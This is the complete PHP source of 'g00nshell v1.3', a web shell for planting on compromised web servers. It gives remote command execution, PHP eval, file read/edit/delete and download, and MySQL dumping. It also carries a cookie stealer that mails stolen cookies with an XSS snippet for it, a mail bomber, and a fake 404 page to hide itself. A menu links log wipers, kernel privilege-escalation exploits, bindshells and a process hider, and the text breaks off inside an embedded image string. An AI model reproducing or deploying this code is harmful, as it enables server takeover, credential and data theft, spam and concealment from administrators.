<?php
/*
######################################################################
#                       [g00n]FiSh presents:                         #
#                       g00nshell v1.3 final                         #
############################DOCUMENTATION#############################
#To execute commands, simply include ?cmd=___ in the url.            #
#Ex: http://site.com/shl.php?cmd=whoami                              #
#                                                                    #
#To steal cookies, use ?cookie=___ in the url.                       #
#Ex: <script>document.location.href=                                 #
#'http://site.com/shl.php?cookie='+document.cookies</script>         #
##########################VERIFICATION LEVELS#########################
#0: No protection; anyone can access                                 #
#1: User-Agent required                                              #
#2: Require IP                                                       #
#3: Basic Authentication                                             #
##############################KNOWN BUGS##############################
#Windows directory handling                                          #
#                                                                    #
#The SQL tool is NOT complete. There is currently no editing function#
#available. Some time in the future this may be fixed, but for now   #
#don't complain to me about it                                       #
################################SHOUTS################################
#pr0be - Beta testing  & CSS                                         #
#TrinTiTTY - Beta testing                                            #
#clorox - Beta testing                                               #
#Everyone else at g00ns.net                                          #
########################NOTE TO ADMINISTRATORS########################
#If this script has been found on your server without your approval, #
#it would probably be wise to delete it and check your logs.         #
######################################################################
*/

// Configuration
$auth = 0;
$uakey = "b5c3d0b28619de70bf5588505f4061f2"; // MD5 encoded user-agent
$IP = array("127.0.0.2","127.0.0.1"); // IP Addresses allowed to access shell
$email = ""; // E-mail address where cookies will be sent
$user  = "af1035a85447f5aa9d21570d884b723a"; // MD5 encoded User
$pass = "47e331d2b8d07465515c50cb0fad1e5a"; // MD5 encoded Password

// Global Variables
$version = "1.3 final";
$self = $_SERVER['PHP_SELF'];
$soft = $_SERVER["SERVER_SOFTWARE"];
$servinf = split("[:]", getenv('HTTP_HOST'));
$servip = $servinf[0];
$servport = $servinf[1];
$uname = php_uname();
$curuser = @exec('whoami');
$cmd = $_GET['cmd'];
$act = $_GET['act'];
$cmd = $_GET['cmd'];
$cookie = $_GET['cookie'];
$f = $_GET['f'];
$curdir = cleandir(getcwd());
if(!$dir){$dir = $_GET['dir'];}
elseif($dir && $_SESSION['dir']){$dir = $_SESSION['dir'];}
elseif($dir && $_SESSION['dir']){$dir = $curdir;}
if($dir && $dir != "nullz"){$dir = cleandir($dir);}
$contents = $_POST['contents'];
$gf = $_POST['gf'];
$img = $_GET['img'];
session_start();
@set_time_limit(5);
switch($auth){ // Authentication switcher
  case 0: break;
  case 1: if(md5($_SERVER['HTTP_USER_AGENT']) != $uakey){hide();} break;
  case 2: if(!in_array($_SERVER['REMOTE_ADDR'],$IP)){hide();} break;
  case 3: if(!$_SERVER["PHP_AUTH_USER"]){userauth();} break;
}
  
function userauth(){ // Basic authentication function
  global $user, $pass;
  header("WWW-Authenticate: Basic realm='Secure Area'");
  if(md5($_SERVER["PHP_AUTH_USER"]) != $user || md5($_SERVER["PHP_AUTH_PW"] != $pass)){
    hide();
    die();
  }
}

if(!$act && !$cmd && !$cookie && !$f && !$dir && !$gf && !$img){main();}
elseif(!$act && $cmd){
  style();
  echo("<b>Results:</b>\n<br><textarea rows=20 cols=100>");
  $cmd = exec($cmd, $result);
  foreach($result as $line){echo($line . "\n");}
  echo("</textarea>");
}
elseif($cookie){@mail("$email", "Cookie Data", "$cookie", "From: $email"); hide();} // Cookie stealer function
elseif($act == "view" && $f && $dir){view($f, $dir);}
elseif($img){img($img);}
elseif($gf){grab($gf);}
elseif($dir){files($dir);}
else{
  switch($act){
    case "phpinfo": phpinfo();break;
    case "sql": sql();break;
    case "files": files($dir);break;
    case "email": email();break;
    case "cmd": cmd();break;
    case "upload": upload();break;
    case "tools": tools();break;
    case "sqllogin": sqllogin();break;
    case "sql": sql();break;
    case "lookup": lookup();break;
    case "kill": kill();break;
    case "phpexec": execphp();break;
    default: main();break;
  }
}

function cleandir($d){ // Function to clean up the $dir and $curdir variables
  $d = realpath($d);
  $d = str_replace("\\\\", "//", $d);
  $d = str_replace("////", "//", $d);
  $d = str_replace("\\", "/", $d);
  return($d);
}



function hide(){ // Hiding function
  global $self, $soft, $servip, $servport;
die("<!DOCTYPE HTML PUBLIC '-//IETF//DTD HTML 2.0//EN'>
<HTML><HEAD>
<TITLE>404 Not Found</TITLE>
</HEAD><BODY>
<H1>Not Found</H1>
The requested URL $self was not found on this server.<P>
<P>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.
<HR>
<ADDRESS>$soft Server at $servip Port $servport</ADDRESS>
</BODY></HTML>");
}

function style(){ // Style / header function
  global $servip,$version;
  echo("<html>\n
  <head>\n
  <title>g00nshell v" . $version . " - " . $servip . "</title>\n
  <style>\n
  body { background-color:#000000; color:white; font-family:Verdana; font-size:11px; }\n
  h1 { color:white; font-family:Verdana; font-size:11px; }\n
  h3 { color:white; font-family:Verdana; font-size:11px; }\n
  input,textarea,select { color:#FFFFFF; background-color:#2F2F2F; border:1px solid #4F4F4F; font-family:Verdana; font-size:11px; }\n
  textarea { font-family:Courier; font-size:11px; }\n
  a { color:#6F6F6F; text-decoration:none; font-family:Verdana; font-size:11px; }\n
  a:hover { color:#7F7F7F; }\n
  td,th { font-size:12px; vertical-align:middle; }\n
  th { font-size:13px; }\n
  table { empty-cells:show;}\n
  .inf { color:#7F7F7F; }\n
  </style>\n
  </head>\n");
}

function main(){ // Main/menu function
  global $self, $servip, $servport, $uname, $soft, $banner, $curuser, $version;
  style();
  $act = array('cmd'=>'Command Execute','files'=>'File View','phpinfo'=>'PHP info', 'phpexec'=>'PHP Execute',
  'tools'=>'Tools','sqllogin'=>'SQL','email'=>'Email','upload'=>'Get Files','lookup'=>'List Domains','bshell'=>'Bindshell','kill'=>'Kill Shell');
  $capt = array_flip($act);
  echo("<form method='GET' name='shell'>");
  echo("<b>Host:</b> <span class='inf'>" . $servip . "</span><br>");
  echo("<b>Server software:</b> <span class='inf'>" . $soft . "</span><br>");
  echo("<b>Uname:</b> <span class='inf'>" . $uname . "</span><br>");
  echo("<b>Shell Directory:</b> <span class='inf'>" . getcwd() . "</span><br>");
  echo("<div style='display:none' id='info'>");
  echo("<b>Current User:</b> <span class='inf'>" . $curuser . "</span><br>");
  echo("<b>ID:</b> <span class='inf'>" . @exec('id') . "</span><br>");
  if(@ini_get('safe_mode') != ""){echo("<b>Safemode:</b> <font color='red'>ON</font>");}
  else{echo("<b>Safemode:</b> <font color='green'>OFF</font>");}
  echo("\n<br>\n");
  if(@ini_get('open_basedir') != ""){echo("<b>Open Base Dir:</b> <font color='red'>ON</font> [ <span class='inf'>" . ini_get('open_basedir') . "</span> ]");}
  else{echo("<b>Open Base Dir:</b> <font color='green'>OFF</font>");}
  echo("\n<br>\n");
  if(@ini_get('disable_functions') != ""){echo("<b>Disabled functions:</b> " . @ini_get('disable_functions'));}
  else{echo("<b>Disabled functions:</b> None");}
  echo("\n<br>\n");
  if(@function_exists(mysql_connect)){echo("<b>MySQL:</b> <font color='green'>ON</font>");}
  else{echo("<b>MySQL:</b> <font color='red'>OFF</font>");}
  echo("</div>");
  echo("[ <a href='#hax' onClick=\"document.getElementById('info').style.display = 'block';\">More</a> ] ");
  echo("[ <a href='#hax' onClick=\"document.getElementById('info').style.display = 'none';\">Less</a> ]");
  echo("<center>");
  echo("<h3 align='center'>Links</h3>");
  if($_SERVER['QUERY_STRING']){foreach($act as $link){echo("[ <a href='?" . $_SERVER['QUERY_STRING'] . "&act=" . $capt[$link] . "' target='frm'>" . $link . "</a> ] ");}}
  else{foreach($act as $link){echo("[ <a href='?act=" . $capt[$link] . "' target='frm'>" . $link . "</a> ] ");}}
  echo("</center>");
  echo("<hr>");
  echo("<br><iframe name='frm' style='width:100%; height:65%; border:0;' src='?act=files'></iframe>");
  echo("<pre style='text-align:center'>:: g00nshell <font color='red'>v" . $version . "</font> ::</pre>");
  die();
}

function cmd(){ // Command execution function
  style();
  echo("<form name='CMD' method='POST'>");
  echo("<b>Command:</b><br>");
  echo("<input name='cmd' type='text' size='50'> ");
  echo("<select name='precmd'>");
  $precmd = array(''=>'','Read /etc/passwd'=>'cat /etc/passwd','Open ports'=>'netstat -an',
                  'Running Processes'=>'ps -aux', 'Uname'=>'uname -a', 'Get UID'=>'id',
                  'Create Junkfile (/tmp/z)'=>'dd if=/dev/zero of=/tmp/z bs=1M count=1024',
                  'Find passwd files'=>'find / -type f -name passwd');
  $capt = array_flip($precmd);
  foreach($precmd as $c){echo("<option value='" . $c . "'>" . $capt[$c] . "\n");}
  echo("</select><br>\n");
  echo("<input type='submit' value='Execute'>\n");
  echo("</form>\n");
  if($_POST['cmd'] != ""){$x = $_POST['cmd'];}
  elseif($_POST['precmd'] != ""){$x = $_POST['precmd'];}
  else{die();}
  echo("Results: <br><textarea rows=20 cols=100>");
  $cmd = @exec($x, $result);
  foreach($result as $line){echo($line . "\n");}
  echo("</textarea>");
}

function execphp(){ // PHP code execution function
  style();
  echo("<h4>Execute PHP Code</h4>");
  echo("<form method='POST'>");
  echo("<textarea name='phpexec' rows=5 cols=100>");
  if(!$_POST['phpexec']){echo("/*Don't include <? ?> tags*/\n");}
  echo(htmlentities($_POST['phpexec']) . "</textarea>\n<br>\n");
  echo("<input type='submit' value='Execute'>");
  echo("</form>");
  if($_POST['phpexec']){
    echo("<textarea rows=10 cols=100>");
    eval(stripslashes($_POST['phpexec']));
    echo("</textarea>");
  }
}

function sqllogin(){ // MySQL login function
  session_start();
  if($_SESSION['isloggedin'] == "true"){
    header("Location: ?act=sql");
  }
  style();
  echo("<form method='post' action='?act=sql'>");
  echo("User:<br><input type='text' name='un' size='30'><br>\n");
  echo("Password:<br><input type='text' name='pw' size='30'><br>\n");
  echo("Host:<br><input type='text' name='host' size='30' value='localhost'><br>\n");
  echo("Port:<br><input type='text' name='port' size='30' value='3306'><br>\n");
  echo("<input type='submit' value='Login'>");
  echo("</form>");
  die();
}

function sql(){ // General SQL Function
  session_start();
  if(!$_GET['sqlf']){style();}
  if($_POST['un'] && $_POST['pw']){;
    $_SESSION['sql_user'] = $_POST['un'];
    $_SESSION['sql_password'] = $_POST['pw'];
  }
  if($_POST['host']){$_SESSION['sql_host'] = $_POST['host'];}
  else{$_SESSION['sql_host'] = 'localhost';}
  if($_POST['port']){$_SESSION['sql_port'] = $_POST['port'];}
  else{$_SESSION['sql_port'] = '3306';}

  if($_SESSION['sql_user'] && $_SESSION['sql_password']){
    if(!($sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_port'], $_SESSION['sql_user'], $_SESSION['sql_password']))){
      unset($_SESSION['sql_user'], $_SESSION['sql_password'], $_SESSION['sql_host'], $_SESSION['sql_port']);
      echo("Invalid credentials<br>\n");
      die(sqllogin());
    }
    else{
      $_SESSION['isloggedin'] = "true";
    }
  }
  else{
    die(sqllogin());
  }

  if ($_GET['db']){
    mysql_select_db($_GET['db'], $sqlcon);
    if($_GET['sqlquery']){
      $dat = mysql_query($_GET['sqlquery'], $sqlcon) or die(mysql_error());
      $num = mysql_num_rows($dat);
      for($i=0;$i<$num;$i++){
        echo(mysql_result($dat, $i) . "<br>\n");
      }
    }
    else if($_GET['table'] && !$_GET['sqlf']){
      echo("<a href='?act=sql&db=" . $_GET['db'] . "&table=" . $_GET['table'] . "&sqlf=ins'>Insert Row</a><br><br>\n");
      echo("<table border='1'>");
      $query = "SHOW COLUMNS FROM " . $_GET['table'];
      $result = mysql_query($query, $sqlcon) or die(mysql_error());
      $i = 0;
      $fields = array();
      while($row = mysql_fetch_assoc($result)){
        array_push($fields, $row['Field']);
        echo("<th>" . $fields[$i]);
        $i++;
      }
      $result = mysql_query("Select * FROM " . $_GET['table'], $sqlcon) or die(mysql_error());
      $num_rows = mysql_num_rows($result) or die(mysql_error());
      $y=0;
      for($x=1;$x<=$num_rows+1;$x++){
        if(!$_GET['p']){
          $_GET['p'] = 1;
        }
        if($_GET['p']){
          if($y > (30*($_GET['p']-1)) && $y <= 30*($_GET['p'])){
            echo("<tr>");
            for($i=0;$i<count($fields);$i++){
              $query = "Select " . $fields[$i] . " FROM " . $_GET['table'] . " Where " . $fields[0] . " = '" . $x . "'";
              $dat = mysql_query($query, $sqlcon) or die(mysql_error());
              while($row = mysql_fetch_row($dat)){
                echo("<td>" . $row[0] . "</td>");
              }
            }
            echo("</tr>\n");
          }
        }
        $y++;
      }
      echo("</table>\n");
      for($z=1;$z<=ceil($num_rows / 30);$z++){
        echo("<a href='?act=sql&db=" . $_GET['db'] . "&table=" . $_GET['table'] . "&p=" . $z . "'>" . $z . "</a> | ");
      }
    }
    elseif($_GET['table'] && $_GET['sqlf']){
      switch($_GET['sqlf']){
        case "dl": sqldownload();break;
        case "ins": sqlinsert();break;
        default: $_GET['sqlf'] = "";
      }
    }
    else{
      echo("<table>");
      $query = "SHOW TABLES FROM " . $_GET['db'];
      $dat = mysql_query($query, $sqlcon) or die(mysql_error());
      while ($row = mysql_fetch_row($dat)){
        echo("<tr><td><a href='?act=sql&db=" . $_GET['db'] . "&table=" . $row[0] ."'>" . $row[0] . "</a></td><td>[<a href='?act=sql&db=" . $_GET['db'] . "&table=" . $row[0] ."&sqlf=dl'>Download</a>]</td></tr>\n");
      }
      echo("</table>");
    }
  }
  else{
    $dbs=mysql_list_dbs($sqlcon);
    while($row = mysql_fetch_object($dbs)) {
      echo("<a href='?act=sql&db=" . $row->Database . "'>" . $row->Database . "</a><br>\n");
    }
  }
  mysql_close($sqlcon);
}

function sqldownload(){ // Download sql file function
  @ob_flush;
  $sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_port'], $_SESSION['sql_user'], $_SESSION['sql_password']);
  mysql_select_db($_GET['db'], $sqlcon);
  $query = "SHOW COLUMNS FROM " . $_GET['table'];
  $result = mysql_query($query, $sqlcon) or die(mysql_error());
  $fields = array();
  while($row = mysql_fetch_assoc($result)){
    array_push($fields, $row['Field']);
    $i++;
  }
  $result = mysql_query("Select * FROM " . $_GET['table'], $sqlcon) or die(mysql_error());
  $num_rows = mysql_num_rows($result) or die(mysql_error());
  for($x=1;$x<$num_rows;$x++){
    $out .= "(";
    for($i=0;$i<count($fields);$i++){
      $out .= "'";
      $query = "Select " . $fields[$i] . " FROM " . $_GET['table'] . " Where " . $fields[0] . " = '" . $x . "'";
      $dat = mysql_query($query, $sqlcon) or die(mysql_error());
      while($row = mysql_fetch_row($dat)){
        if($row[0] == ""){
          $row[0] = "NULL";
        }
        if($i != count($fields)-1){
          $out .= str_replace("\r\n", "\\r\\n", $row[0]) . "', ";
        }
        else{
          $out .= $row[0]. "'";
        }
      }
    }
    $out .= ");\n";
  }
  $filename = $_GET['table'] . "-" . time() . '.sql';
  header("Content-type: application/octet-stream");
  header("Content-length: " . strlen($out));
  header("Content-disposition: attachment; filename=" . $filename . ";");
  echo($out);
  die();
}

function sqlinsert(){
  style();
  $sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_port'], $_SESSION['sql_user'], $_SESSION['sql_password']);
  mysql_select_db($_GET['db'], $sqlcon);
  if($_POST['ins']){
    unset($_POST['ins']);
    $fields = array_flip($_POST);
    $f = implode(",", $fields);
    $v = implode(",", $_POST);
    $query = "Insert INTO " . $_GET['table'] . " (" . $f . ") VALUES (" . $v . ")";
    mysql_query($query, $sqlcon) or die(mysql_error());
    die("Row inserted.<br>\n<a href='?act=sql&db=" . $_GET['db'] . "&table=" . $_GET['table'] . "'>Go back</a>");
  }
  $query = "SHOW COLUMNS FROM " . $_GET['table'];
  $result = mysql_query($query, $sqlcon) or die(mysql_error());
  $i = 0;
  $fields = array();
  echo("<form method='POST'>");
  echo("<table>");
  while($row = mysql_fetch_assoc($result)){
    array_push($fields, $row['Field']);
    echo("<tr><td><b>" . $fields[$i] . "</b><td><input type='text' name='" . $fields[$i] . "'><br>\n");
    $i++;
  }
  echo("</table>");
  echo("<br>\n<input type='submit' value='Insert' name='ins'>");
  echo("</form>");
}

function nicesize($size){
  if(!$size){return false;}
  if ($size >= 1073741824){return(round($size / 1073741824) . " GB");}
  elseif ($size >= 1048576){return(round($size / 1048576) . " MB");}
  elseif ($size >= 1024){return(round($size / 1024) . " KB");}
  else{return($size . " B");}
}

function files($dir){ // File manipulator function
  style();
  global $self, $curdir;
  if($dir==""){$dir = $curdir;}
  $dirx = explode("/", $dir);
  $files = array();
  $folders = array();
  echo("<form method='GET'>");
  echo("<input type='text' name='dir' value='" . $dir . "' size='40'>");
  echo("<input type='submit' value='Go'>");
  echo("</form>");
  echo("<h4>File list for ");
  for($i=0;$i<count($dirx);$i++){
    $totalpath .= $dirx[$i] . "/";
    echo("<a href='?dir=" . $totalpath . "'>$dirx[$i]</a>" . "/");
  }
  echo("</h4>");
  echo("<table>");
  echo("<th>File Name<th>File Size</th>");
  if ($handle = opendir($dir)) {
    while (false != ($link = readdir($handle))) {
      if (is_dir($dir . '/' . $link)){
        $file = array();
        if(is_writable($dir . '/' . $link)){$file['perm']='write';}
        elseif(is_readable($dir . '/' . $link)){$file['perm']='read';}
        else{$file['perm']='none';}
        switch($file['perm']){
          case "write": @$file['link'] = "<a href='?dir=$dir/$link'><font color='green'>$link</font></a>"; break;
          case "read": @$file['link'] = "<a href='?dir=$dir/$link'><font color='yellow'>$link</font></a>"; break;
          case "none": @$file['link'] = "<a href='?dir=$dir/$link'><font color='red'>$link</font></a>"; break;
          default: @$file['link'] = "<a href='?dir=$dir/$link'><font color='red'>$link</font></a>"; break;
        }
        @$file['icon'] = "folder";
        if($_SERVER['QUERY_STRING']){$folder = "<img src='?" . $_SERVER['QUERY_STRING'] . "&img=" . $file['icon']. "'> " . $file['link'];}
        else{$folder = "<img src='?img=" . $file['icon']. "'> " . $file['link'];}
        array_push($folders, $folder);
      }
      else{
        $file = array();
        $ext = strtolower(end(explode(".", $link)));
        if(!$file['size'] = nicesize(@filesize($dir . '/' . $link))){
          $file['size'] = "0B";
        }
        if(is_writable($dir . '/' . $link)){$file['perm']='write';}
        elseif(is_readable($dir . '/' . $link)){$file['perm']='read';}
        else{$file['perm']='none';}
        switch($file['perm']){
          case "write": @$file['link'] = "<a href='?act=view&f=" . $link . "&dir=$dir'><font color='green'>$link</font></a>"; break;
          case "read": @$file['link'] = "<a href='?act=view&f=" . $link . "&dir=$dir'><font color='yellow'>$link</font></a>"; break;
          case "none": @$file['link'] = "<a href='?act=view&f=" . $link . "&dir=$dir'><font color='red'>$link</font></a>"; break;
          default: @$file['link'] = "<a href='?act=view&f=" . $link . "&dir=$dir'><font color='red'>$link</a></font>"; break;
        }
        switch($ext){
        case "exe": case "com": case "jar": case "": $file['icon']="binary"; break;
        case "jpg": case "gif": case "png": case "bmp": $file['icon']="image"; break;
        case "zip": case "tar": case "rar": case "gz": case "cab": case "bz2": case "gzip": $file['icon']="compressed"; break;
        case "txt": case "doc": case "pdf": case "htm": case "html": case "rtf": $file['icon']="text"; break;
        case "wav": case "mp3": case "mp4": case "wma": $file['icon']="sound"; break;
        case "js": case "vbs": case "c": case "h": case "sh": case "pl": case "py": case "php": case "h": $file['icon']="script"; break;
        default: $file['icon'] = "unknown"; break;
        }
        if($_SERVER['QUERY_STRING']){$file = "<tr><td><img src='?" . $_SERVER['QUERY_STRING'] . "&img=" . $file['icon']. "' height='18' width='18'> " . $file['link'] . "</td><td>" . $file['size'] . "</td></tr>\n";}
        else{$file = "<tr><td><img src='?img=" . $file['icon']. "' height='18' width='18'> " . $file['link'] . "<td>" . $file['size'] . "</td></tr>\n";}
        array_push($files, $file);
      }
    }
  foreach($folders as $folder){echo("<tr><td>$folder</td><td>DIR</td></tr>\n");}
  foreach($files as $file){echo($file);}
  echo("</table>");
  closedir($handle);
  }
}

function email(){ // Email bomber function
  $times = $_POST['times'];
  $to = $_POST['to'];
  $subject = $_POST['subject'];
  $body = $_POST['body'];
  $from = $_POST['from'];

  style();
  echo("<h2>Mail Bomber</h2>
  <form method='POST' action='?act=email'>
  <b>Your address:</b><br>
  <input name='from' type='text' size='35'><br>
  <b>Their address:</b><br>
  <input name='to' type='text' size='35'><br>
  <b>Subject:</b><br>
  <input name='subject' type='text' size='35'><br>
  <b>Text:</b><br>
  <input name='body' type='text' size='35'><br>
  <b>How many times:</b><br>
  <input name='times' type='text' size='5'><br><br>
  <input name='submit' type='submit' value='Submit'>
  </form>");
  if ($to && $from){for($i=0;$i<$times;$i++){mail("$to", "$subject", "$body", "From: $from");}}
}

function view($filename, $dir){ // File view function
  if($_POST['fileact'] == "Download"){
    header("Content-type: application/octet-stream");
    header("Content-length: ".strlen($_POST['contents']));
    header("Content-disposition: attachment; filename=" . basename($filename) . ";");
    $handle = fopen($filename, "r");
    echo(fread($handle, filesize($filename)));
    die();
  }
  style();
  if($_POST['contents'] && $_POST['fileact'] == "Save"){
    $handle = fopen($filename, 'w');
    fwrite($handle, stripslashes($_POST['contents']));
    fclose($handle);
    echo("Saved file.<br><br>");
    echo("<a href='?act=view&f=$filename&dir=nullz'>Go back</a>");
    die();
  }
  elseif($_POST['fileact'] == "Delete"){
    unlink($filename);
    echo("Deleted file.<br><br>");
    echo("<a href='?act=files'>Go back</a>");
    die();
  }

  if($dir != "nullz"){ // heh
    $filename = $dir."/".$filename;
  }
  $bad = array("<", ">");
  $good = array("<", ">");
  $file = fopen($filename, 'r');
  $content = fread($file, @filesize($filename));
  echo("<form name='file' method='POST' action='?act=view&dir=$dir&f=$filename'>");
  echo("<textarea style='width:100%; height:92%;' name='contents'>");
  echo(str_replace($bad, $good, $content)."\n");
  echo("</textarea>");
  echo("<input name='fileact' type='submit' value='Save'>");
  echo("<input name='fileact' type='submit' value='Delete'>");
  echo("<input name='fileact' type='submit' value='Download'>");
  echo("</form>");
}

function edit($file, $contents){ // File edit function
  style();
  $handle = fopen($file, 'w');
  fwrite($handle, $contents);
  fclose($handle);
  echo("Saved file.<br><br>");
  echo("<a href='?act=files'>Go back</a>");
}

function upload(){ // Uploading frontend function
  global $curdir;
  style();
  echo("<form name='files' enctype='multipart/form-data' method='POST'>
  <b>Output Directory</b><br>
  <input type='text' name='loc' size='65' value='" . $curdir . "'><br><br>
  <b>Remote Upload</b><br>
  <input type='text' name='rem' size='65'>
  <input type='submit' value='Grab'><br><br>
  <b>Local File Upload</b><br>
  <input name='up' type='file' size='65'>
  <input type='submit' value='Upload'>
  </form><br>");

  if($_POST['rem']){grab($_POST['rem']);}
  if($_FILES['up']){up($_FILES['up']);}
}

function up($up){ // Uploading backend function
  style();
  $updir = $_POST['loc'];
  move_uploaded_file($up["tmp_name"], $updir . "/" . $up["name"]);
  die("File has been uploaded.");
}

function grab($file){ // Uploading backend function
  style();
  $updir = $_POST['loc'];
  $filex = array_pop(explode("/", $file));
  if(exec("wget $file -b -O $updir/$filex")){die("File has been uploaded.");}
  else{die("File upload failed.");}
}

function tools(){ // Useful tools function
  global $curdir;
  style();
  $tools = array(
  "--- Log wipers ---"=>"1",
  "Vanish2.tgz"=>"http://packetstormsecurity.org/UNIX/penetration/log-wipers/vanish2.tgz",
  "Cloak.c"=>"http://packetstormsecurity.org/UNIX/penetration/log-wipers/cloak.c",
  "gh0st.sh"=>"http://packetstormsecurity.org/UNIX/penetration/log-wipers/gh0st.sh",
  "--- Priv Escalation ---"=>"2",
  "h00lyshit - Linux 2.6 ALL"=>"http://someshit.net/files/xpl/h00lyshit",
  "k-rad3 - Linux <= 2.6.11"=>"http://someshit.net/files/xpl/krad3",
  "raptor - Linux <= 2.6.17.4"=>"http://someshit.net/files/xpl/raptor",
  "rootbsd - BSD v?"=>"http://someshit.net/files/xpl/rootbsd",
  "--- Bindshells ---"=>"3",
  "THC rwwwshell-1.6.perl"=>"http://packetstormsecurity.org/groups/thc/rwwwshell-1.6.perl",
  "Basic Perl bindshell"=>"http://packetstormsecurity.org/groups/synnergy/bindshell-unix",
  "--- Misc ---"=>"4",
  "MOCKS SOCKS4 Proxy"=>"http://superb-east.dl.sourceforge.net/sourceforge/mocks/mocks-0.0.2.tar.gz",
  "xps.c (proc hider)"=>"http://packetstormsecurity.org/groups/shadowpenguin/unix-tools/xps.c");
  $names = array_flip($tools);
  echo("<b>Tools:</b>");
  echo("<form method='post'>");
  echo("<b>Output Directory</b><br>");
  echo("<input type='text' name='loc' size='65' value='" . $curdir . "'><br><br>");
  echo("<select name='gf' style='align:center;'>");
  foreach($tools as $tool) {echo("<option value='" . $tool . "'>" . $names[$tool] . "</option>\n");}
  echo("</select>");
  echo("<br><input type='submit' value='Grab'>");
  echo("</form>");
}

function lookup(){ // Domain lookup function
  style();
  global $servinf;
  $script = "import urllib, urllib2, sys, re
  req = urllib2.Request('http://www.seologs.com/ip-domains.html', urllib.urlencode({'domainname' : sys.argv[1]}))
  site = re.findall('.+\) (.+)<br>', urllib2.urlopen(req).read())
  for i in xrange(0,len(site)):
    print site[i]"; // My sexy python script
  $handle = fopen('lookup.py', 'w');
  fwrite($handle, $script);
  fclose($handle);
  echo("<h4>Domains</h4>");
  echo("<ul>");
  $cmd = exec("python lookup.py " . $servinf[0], $ret);
  foreach($ret as $site){echo("<li>" . $site . "\n");}
  unlink('lookup.py');
}


function img($img){ // Images function
  $images = array(
  "folder"=>"R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAA" .
  "gALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwq" .
  "d1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=",
  "image"=>"R0lGODlhFAAWAOMAAP////8zM8z//8zMzJmZmWZmZmYAADMzMwCZzACZMwAzZgAAAAAAAAAAAAAAAAAAACH+TlRoaX" .
  "MgYXJ0IGlzIGluIHRoZSBwdWJsaWMgZG9tYWluLiBLZXZpbiBIdWdoZXMsIGtldmluaEBlaXQuY29tLCBTZXB0ZW1i" .
  "ZXIgMTk5NQAh+QQBAAACACwAAAAAFAAWAAAEkPDISae4WBzAu99Hdm1eSYYZWXYqOgJBLAcDoNrYNssGsBy/4GsX6y" .
  "2OyMWQ2OMQngSlBjZLWBM1AFSqkyU4A2tWywUMYt/wlTSIvgYGA/Zq3QwU7mmHvh4g8GUsfAUHCH95NwMHV4SGh4Ed" .
  "ihOOjy8rZpSVeiV+mYCWHncKo6Sfm5cliAdQrK1PQBlJsrNSEQA7",
  "unknown"=>"R0lGODlhFAAWAMIAAP///8z//5mZmTMzMwAAAAAAAAAAAAAAACH+TlRoaXMgYXJ0IGlzIGluIHRoZSBwdWJsaWMgZG" .
  "9tYWluLiBLZXZpbiBIdWdoZXMsIGtldmluaEBlaXQuY29tLCBTZXB0ZW1iZXIgMTk5NQAh+QQBAAABACwAAAAAFAAW" .
  "AAADaDi6vPEwDECrnSO+aTvPEQcIAmGaIrhR5XmKgMq1LkoMN7ECrjDWp52r0iPpJJ0KjUAq7SxLE+sI+9V8vycFiM" .
  "0iLb2O80s8JcfVJJTaGYrZYPNby5Ov6WolPD+XDJqAgSQ4EUCGQQEJADs=",
  "binary"=>"R0lGODlhFAAWAMIAAP///8z//8zMzJmZmTMzMwAAAAAAAAAAACH+TlRoaXMgYXJ0IGlzIGluIHRoZSBwdWJsaWMgZG" .
  "9tYWluLiBLZXZpbiBIdWdoZXMsIGtldmluaEBlaXQuY29tLCBTZXB0ZW1iZXIgMTk5NQAh+QQBAAABACwAAAAAFAAW" .
  "AAADaUi6vPEwEECrnSS+WQoQXSEAE6lxXgeopQmha+q1rhTfakHo/HaDnVFo6LMYKYPkoOADim4VJdOWkx2XvirUgq" .
  "VaVcbuxCn0hKe04znrIV/ROOvaG3+z63OYO6/uiwlKgYJJOxFDh4hTCQA7",
  "text"=>"R0lGODlhFAAWAOMAAP/////MM/8zM8z//5mZmZlmM2bM/zMzMwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH+TlRoaX" .
  "MgYXJ0IGlzIGluIHRoZSBwdWJsaWMgZG9tYWluLiBLZXZpbiBIdWdoZXMsIGtldmluaEBlaXQuY29tLCBTZXB0ZW1i" .
  "ZXIgMTk5NQAh+QQBAAADACwAAAAAFAAWAAAEb/DISee4eBzAu99Hdm1eSYbZWXEkgI5sEBg0+2HnTBsccvhAmGtXAy" .
  "COSITwUGg2PYQoQalhOZ/QKLVV6gKmQm8XXDUmzx0yV5ze9s7JdpgtL3ME5jhHTS/xO3hwdWt0f317WwdSi4xRPxlw" .
  "kUgXEQA7",
  "compressed"=>"R0lGODlhFAAWAOcAAP//////zP//mf//Zv//M///AP/M///MzP/Mmf/MZv/MM//MAP+Z//+ZzP+Zmf+ZZv+ZM/+ZAP" .
  "9m//9mzP9mmf9mZv9mM/9mAP8z//8zzP8zmf8zZv8zM/8zAP8A//8AzP8Amf8AZv8AM/8AAMz//8z/zMz/mcz/Zsz/" .
  "M8z/AMzM/8zMzMzMmczMZszMM8zMAMyZ/8yZzMyZmcyZZsyZM8yZAMxm/8xmzMxmmcxmZsxmM8xmAMwz/8wzzMwzmc" .
  "wzZswzM8wzAMwA/8wAzMwAmcwAZswAM8wAAJn//5n/zJn/mZn/Zpn/M5n/AJnM/5nMzJnMmZnMZpnMM5nMAJmZ/5mZ" .
  "zJmZmZmZZpmZM5mZAJlm/5lmzJlmmZlmZplmM5lmAJkz/5kzzJkzmZkzZpkzM5kzAJkA/5kAzJkAmZkAZpkAM5kAAG" .
  "b//2b/zGb/mWb/Zmb/M2b/AGbM/2bMzGbMmWbMZmbMM2bMAGaZ/2aZzGaZmWaZZmaZM2aZAGZm/2ZmzGZmmWZmZmZm" .
  "M2ZmAGYz/2YzzGYzmWYzZmYzM2YzAGYA/2YAzGYAmWYAZmYAM2YAADP//zP/zDP/mTP/ZjP/MzP/ADPM/zPMzDPMmT" .
